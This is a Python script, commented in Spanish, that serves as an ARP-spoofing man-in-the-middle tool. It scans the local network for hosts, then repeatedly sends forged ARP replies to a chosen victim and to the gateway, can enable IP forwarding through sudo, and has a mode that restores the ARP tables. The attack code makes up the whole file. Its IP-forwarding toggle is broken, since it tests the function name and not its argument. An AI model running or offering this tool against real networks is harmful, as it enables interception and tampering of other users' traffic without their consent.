import subprocess
import requests
import scapy.all as scapy
import time
import argparse


def get_gateway():
    gateway = subprocess.Popen("route | grep default | awk '{print $2}'", shell=True, stdout=subprocess.PIPE).stdout
    gw = gateway.readline()

    return (gw.decode()).rstrip()


def escaneo():
    getHosts = subprocess.Popen("sudo arp-scan -l -x -q -r 6", shell=True, stdout=subprocess.PIPE).stdout
    Hosts = getHosts.readlines()

    for i in Hosts:
        st = i[:-1].decode().split()
        hosts.append(st[0])
        macs.append(st[1])


def quitarduplicados():
    auxhosts = list()
    auxmacs = list()

    for item in hosts:

        if item not in auxhosts:
            auxhosts.append(item)
            auxmacs.append(macs[hosts.index(item)])

    print(auxhosts)
    print(auxmacs)


def atacar(ipvictima, macvictima, macgateway):
    ipgateway = get_gateway()
    cont = 0

    while (1):
        f = open("control.txt", "r")
        control = f.read().rstrip('\n')
        if control == '0':
            f.close()
            break

        packet = scapy.ARP(op=2, pdst=ipvictima, hwdst=macvictima, psrc=ipgateway)
        scapy.send(packet, count=2, verbose=False)
        packet = scapy.ARP(op=2, pdst=ipgateway, hwdst=macgateway, psrc=ipvictima)
        scapy.send(packet, count=2, verbose=False)
        # print(f"{cont}paquets enviados")
        cont = cont + 1
        time.sleep(2)
        f.close()


def forwading(opcion):
    if (forwading == 0):
        process = subprocess.Popen("echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward", stdout=subprocess.PIPE)

    elif (forwading == 1):
        process = subprocess.Popen("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward", stdout=subprocess.PIPE)


def parar_ataque(ipvictima, macvictima, ipgateway, macgateway):
    for i in range(5):
        packet = scapy.ARP(op=2, pdst=ipvictima, hwdst=macvictima, psrc=ipgateway, hwsrc=macgateway)
        scapy.send(packet, count=2, verbose=False)


hosts = list()
macs = list()


def main(args):
    if args.eleccion == 'gateway':
        print(get_gateway())

        pass
    elif args.eleccion == 'scan':

        escaneo()
        quitarduplicados()

    elif args.eleccion == 'parar':
        flag = subprocess.Popen("echo 0 > control.txt", shell=True,
                                stdout=subprocess.PIPE).stdout  # flag para que sepa cuando parar

        parar_ataque(ipvictima=args.ipvictima, macvictima=args.macvictima, ipgateway=args.ipgw, macgateway=args.macgw)
    elif args.eleccion == 'atacar':
        flag = subprocess.Popen("echo 1 > control.txt", shell=True,
                                stdout=subprocess.PIPE).stdout  # flag para que sepa cuando parar
        # print("atacando")
        if args.forward == '1':
            forwading(1)
        elif args.forward == '0':
            forwading(0)
        atacar(ipvictima=args.ipvictima, macvictima=args.macvictima, macgateway=args.macgw)


if __name__ == '__main__':
    flag = subprocess.Popen("echo -1 > control.txt", shell=True, stdout=subprocess.PIPE).stdout
    parser = argparse.ArgumentParser()
    parser.add_argument('--eleccion', type=str, default='1', help='define la accion que realizara el programa')
    parser.add_argument('--ipvictima', type=str, default='1', help='ip de la victima a atacar')
    parser.add_argument('--macvictima', type=str, default='1', help='mac de la victima a atacar')
    parser.add_argument('--macgw', type=str, default='1', help='mac de la default gateway')
    parser.add_argument('--ipgw', type=str, default='1', help='ip de la default gateway')
    parser.add_argument('--forward', type=str, default='1', help='define el valor que tendrá el bit de forwading')

    args = parser.parse_args()
    main(args)








